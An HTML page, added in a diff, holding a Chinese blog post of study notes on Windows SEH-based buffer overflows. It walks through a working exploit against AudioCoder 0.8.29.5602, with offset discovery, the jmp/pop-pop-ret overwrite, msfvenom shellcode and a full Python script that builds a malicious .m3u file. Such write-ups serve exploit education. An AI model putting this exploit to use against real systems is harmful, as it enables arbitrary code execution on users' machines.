@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>S.E.H | Chu&#39;s BLoG</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。
+基础概念S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="S.E.H">
+<meta property="og:url" content="http://sh3ll.me/2015/08/09/seh/index.html">
+<meta property="og:site_name" content="Chu's BLoG">
+<meta property="og:description" content="最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。
+基础概念S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：">
+<meta property="og:image" content="http://sh3ll.me/images/2015/08/09/seh-1.png">
+<meta property="og:image" content="http://sh3ll.me/images/2015/08/09/seh-2.png">
+<meta property="og:image" content="http://sh3ll.me/images/2015/08/09/seh-3.png">
+<meta property="og:image" content="http://sh3ll.me/images/2015/08/09/seh-4.png">
+<meta property="og:updated_time" content="2016-07-16T09:12:50.038Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="S.E.H">
+<meta name="twitter:description" content="最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。
+基础概念S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：">
+<meta name="twitter:image" content="http://sh3ll.me/images/2015/08/09/seh-1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Chu&#39;s BLoG" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  <link href="http://fonts.useso.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Chu&#39;s BLoG</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Talk is cheap, show me the shell.</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="sub-nav">
+        
+          <a id="nav-home-icon" class="nav-icon" href="/"></a>
+        
+          <a id="nav-archives-icon" class="nav-icon" href="/archives"></a>
+        
+          <a id="nav-about-icon" class="nav-icon" href="/about"></a>
+        
+          <a id="nav-links-icon" class="nav-icon" href="/links"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-seh" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      S.E.H
+    </h1>
+  
+
+      </header>
+    
+    <time class="article-date" datetime="2015-08-09T04:30:41.000Z" itemprop="datePublished">08-09-2015</time>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Exploit/">Exploit</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近学习了《0day 安全 软件漏洞分析技术》中的堆溢出及 S.E.H 章节，记录笔记如下。</p>
+<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>S.E.H 即异常处理结构体（Structure Exception Handler），它是 Windows 异常处理机制所采用的重要数据结构。每个 S.E.H 包含两个 DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共 8 个字节，如图：<a id="more"></a><br><img src="/images/2015/08/09/seh-1.png" alt="图 1"></p>
+<blockquote>
+<p>S.E.H 按照级别可分为：线程的异常处理、进程的异常处理、系统默认的异常处理（U.E.F），其整体的处理流程为：</p>
+<ul>
+<li>CPU 执行时发生未捕获异常，内核结果进程的控制权，开始内核态的异常处理。</li>
+<li>内核异常结束，将控制权还给 ring3.</li>
+<li>ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher() 函数。</li>
+<li>KiUserExceptionDispatcher() 首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。</li>
+<li>在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException() 函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。</li>
+<li>如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter() 函数设定进程处理异常，则这个异常处理将被调用。</li>
+<li>如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理 UnhandledExceptionFilter() 将会被调用。U.E.F 会根据注册表中相关信息决定是默默地关闭程序，还是弹出错误对话框。</li>
+</ul>
+</blockquote>
+<h2 id="测试目标及测试环境"><a href="#测试目标及测试环境" class="headerlink" title="测试目标及测试环境"></a>测试目标及测试环境</h2><p>参考<a href="http://x0day.me/index.php/archives/seh-based-exploit.html" target="_blank" rel="external">小马哥的文章</a>，我也采用 AudioCoder 作为测试软件。<br>测试目标：AudioCoder 0.8.29.5602<br>测试环境：Windows XP SP3 + Immunity Debugger</p>
+<h2 id="计算溢出长度"><a href="#计算溢出长度" class="headerlink" title="计算溢出长度"></a>计算溢出长度</h2><p>通过 <code>!mona pc 4096</code> 生成测试字符串，编写如下脚本生成 poc 文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">buf = &quot;http://&quot;</div><div class="line"></div><div class="line">buf += &quot;Aa0Aa1Aa2Aa3Aa4Aa5...&quot;</div><div class="line"></div><div class="line">poc_file = open(&quot;poc.m3u&quot;, &quot;wb&quot;)</div><div class="line">poc_file.write(buf)</div><div class="line">poc_file.close()</div></pre></td></tr></table></figure></p>
+<p>将生成的 poc.m3u 加载到 AudioCoder 中，通过 <code>!mona findmsp</code> 观察到 nseh 已被覆盖：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">...snip...</div><div class="line"></div><div class="line">[+] Examining SEH chain</div><div class="line">    SEH record (nseh field) at 0x0012e6f4 overwritten with normal pattern : 0x7a41327a (offset 757), followed by 3331 bytes of cyclic data after the handler</div><div class="line"></div><div class="line">...snip...</div></pre></td></tr></table></figure></p>
+<p>溢出长度为 757。<br>验证一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">buf = &quot;http://&quot;</div><div class="line"></div><div class="line">buf += &quot;A&quot; * 757</div><div class="line">buf += &quot;B&quot; * 4 		#nseh</div><div class="line">buf += &quot;C&quot; * 4 		#seh</div><div class="line"></div><div class="line">poc_file = open(&quot;poc.m3u&quot;, &quot;wb&quot;)</div><div class="line">poc_file.write(buf)</div><div class="line">poc_file.close()</div></pre></td></tr></table></figure></p>
+<p>重新加载 poc，debugger 中可以看到 nseh 和 seh 已被覆盖：<br><img src="/images/2015/08/09/seh-2.png" alt="图 2"></p>
+<h2 id="构造溢出字符串"><a href="#构造溢出字符串" class="headerlink" title="构造溢出字符串"></a>构造溢出字符串</h2><p>利用跳转技术，通常将 S.E.H 溢出的 buf 构造为如下格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">buf + jmp 06 + ppr + nops + shellcode</div></pre></td></tr></table></figure></p>
+<p>也就是说将 nseh 覆盖为 <code>jmp 06</code>，seh 覆盖为 <code>pop; pop; ret</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">!mona asm -s jmp 06     =&gt;		\xeb\x06</div><div class="line">!mona seh               =&gt; 		0x66012e63</div></pre></td></tr></table></figure></p>
+<p>生成 poc 文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">buf = &quot;http://&quot;</div><div class="line"></div><div class="line">buf += &quot;A&quot; * 757</div><div class="line">buf += &quot;\xeb\x06\x90\x90&quot; 		#nseh</div><div class="line">buf += &quot;\x63\x2e\x01\x66&quot; 		#seh</div><div class="line">buf += &quot;\x90&quot; * 20</div><div class="line"></div><div class="line">poc_file = open(&quot;poc.m3u&quot;, &quot;wb&quot;)</div><div class="line">poc_file.write(buf)</div><div class="line">poc_file.close()</div></pre></td></tr></table></figure></p>
+<p>在 <code>0x66012e63</code> 处断点后，调试发现最终成功跳至 shellcode 处执行代码：<br><img src="/images/2015/08/09/seh-3.png" alt="图 3"></p>
+<h2 id="完整的利用代码"><a href="#完整的利用代码" class="headerlink" title="完整的利用代码"></a>完整的利用代码</h2><p>通过 msfvenom 生成 shellcode，注意去除坏字符：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./msfvenom -p windows/exec CMD=calc.exe -b &quot;\x00\xff\x0a\x0d&quot; -f python</div></pre></td></tr></table></figure></p>
+<p>最终利用代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python3</div><div class="line"></div><div class="line">buf = b&quot;http://&quot; + b&quot;\x90&quot; * 757</div><div class="line"></div><div class="line">nseh = b&quot;\xeb\x06\x90\x90&quot;</div><div class="line"></div><div class="line">seh = b&quot;\x63\x2e\x01\x66&quot;</div><div class="line"></div><div class="line">shellcode = (</div><div class="line">b&quot;\xb8\x7c\xf0\x94\x23\xda\xde\xd9\x74\x24\xf4\x5b\x2b&quot;</div><div class="line">b&quot;\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x0f\x03\x43\x73\x12&quot;</div><div class="line">b&quot;\x61\xdf\x63\x50\x8a\x20\x73\x35\x02\xc5\x42\x75\x70&quot;</div><div class="line">b&quot;\x8d\xf4\x45\xf2\xc3\xf8\x2e\x56\xf0\x8b\x43\x7f\xf7&quot;</div><div class="line">b&quot;\x3c\xe9\x59\x36\xbd\x42\x99\x59\x3d\x99\xce\xb9\x7c&quot;</div><div class="line">b&quot;\x52\x03\xbb\xb9\x8f\xee\xe9\x12\xdb\x5d\x1e\x17\x91&quot;</div><div class="line">b&quot;\x5d\x95\x6b\x37\xe6\x4a\x3b\x36\xc7\xdc\x30\x61\xc7&quot;</div><div class="line">b&quot;\xdf\x95\x19\x4e\xf8\xfa\x24\x18\x73\xc8\xd3\x9b\x55&quot;</div><div class="line">b&quot;\x01\x1b\x37\x98\xae\xee\x49\xdc\x08\x11\x3c\x14\x6b&quot;</div><div class="line">b&quot;\xac\x47\xe3\x16\x6a\xcd\xf0\xb0\xf9\x75\xdd\x41\x2d&quot;</div><div class="line">b&quot;\xe3\x96\x4d\x9a\x67\xf0\x51\x1d\xab\x8a\x6d\x96\x4a&quot;</div><div class="line">b&quot;\x5d\xe4\xec\x68\x79\xad\xb7\x11\xd8\x0b\x19\x2d\x3a&quot;</div><div class="line">b&quot;\xf4\xc6\x8b\x30\x18\x12\xa6\x1a\x76\xe5\x34\x21\x34&quot;</div><div class="line">b&quot;\xe5\x46\x2a\x68\x8e\x77\xa1\xe7\xc9\x87\x60\x4c\x25&quot;</div><div class="line">b&quot;\xc2\x29\xe4\xae\x8b\xbb\xb5\xb2\x2b\x16\xf9\xca\xaf&quot;</div><div class="line">b&quot;\x93\x81\x28\xaf\xd1\x84\x75\x77\x09\xf4\xe6\x12\x2d&quot;</div><div class="line">b&quot;\xab\x07\x37\x4e\x2a\x94\xdb\xbf\xc9\x1c\x79\xc0&quot;</div><div class="line">)</div><div class="line"></div><div class="line">payload = buf + nseh + seh + b&quot;\x90&quot; * 20 + shellcode</div><div class="line"></div><div class="line">m3u_file = open(&quot;poc.m3u&quot;, &quot;wb&quot;)</div><div class="line">m3u_file.write(payload)</div><div class="line">m3u_file.close()</div></pre></td></tr></table></figure></p>
+<p><img src="/images/2015/08/09/seh-4.png" alt="图 4"><br>注：shellcode 运行后，AudioCoder 退出。</p>
+<h2 id="其他异常处理利用思路"><a href="#其他异常处理利用思路" class="headerlink" title="其他异常处理利用思路"></a>其他异常处理利用思路</h2><p>还可以通过攻击 V.E.H、攻击 TEB、攻击 U.E.F 等方式利用异常处理，具体可以参考 David Litchfield 在 Black Hat 上的演讲，PPT 地址：<a href="http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt" target="_blank" rel="external">http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt</a></p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
+<li>《0day 安全 软件漏洞分析技术》</li>
+<li><a href="http://x0day.me/index.php/archives/seh-based-exploit.html" target="_blank" rel="external">exploit with SEH - DM_’s blog</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a href="http://sh3ll.me/2015/08/09/seh/#disqus_thread" class="article-comment-link">Comments</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2015/08/11/offbyone-and-cpp-virtual-function/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          对 Off by one Overflow 与 攻击 C++虚函数的理解
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2015/03/22/python-event-handler/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Python 实现事件监听</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 Chu<br>
+      <a href="https://github.com/steven5538/hexo-theme-athena" target="_blank">Athena</a> by <a href="http://steven5538.tw" target="_blank">Steven5538</a> | Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | <script src="http://s11.cnzz.com/z_stat.php?id=1254610758&web_id=1254610758" language="JavaScript"></script>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+<script>
+  var disqus_shortname = 'sh3ll';
+  
+  var disqus_url = 'http://sh3ll.me/2015/08/09/seh/';
+  
+  (function(){
+    var dsq = document.createElement('script');
+    dsq.type = 'text/javascript';
+    dsq.async = true;
+    dsq.src = '//go.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+  })();
+</script>
+
+
+<script src="http://libs.baidu.com/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+  </div>
+</body>
+</html>
